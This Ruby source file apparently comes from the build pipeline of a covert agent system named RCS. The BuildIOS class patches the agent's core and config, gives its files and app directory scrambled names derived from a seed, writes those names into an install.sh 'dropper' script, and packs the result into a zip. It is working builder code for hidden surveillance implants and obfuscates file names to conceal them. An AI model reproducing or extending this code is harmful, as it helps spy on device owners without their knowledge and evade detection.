#
#  Agent creation for iOS
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildIOS < Build

  def initialize
    super
    @platform = 'ios'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # invoke the generic patch method with the new params
    super

  end

  def scramble
    trace :debug, "Build: scrambling"

    core = scramble_name(@factory.seed, 3)
    core_backup = scramble_name(core, 32)
    dir = scramble_name(core[0..7], 7) + '.app'
    config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
    dylib = scramble_name(config, 2)

    @scrambled = {core: core, dir: dir, config: config, dylib: dylib}

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    # open the install.sh dropper and patch the value of the files to be installed
    file = File.open(path('install.sh'), 'rb+')
    content = file.read

    begin
      content['[:RCS_DIR:]'] = @scrambled[:dir]
    rescue
      raise "Install Dir marker not found"
    end

    begin
      content['[:RCS_CORE:]'] = @scrambled[:core]
    rescue
      raise "Core marker not found"
    end

    begin
      content['[:RCS_CONF:]'] = @scrambled[:config]
    rescue
      raise "Config marker not found"
    end

    begin
      content['[:RCS_DYLIB:]'] = @scrambled[:dylib]
    rescue
      raise "Dylib marker not found"
    end
    
    file.rewind
    file.write content
    file.close

  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |output|
        z.file.open(output, "w") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
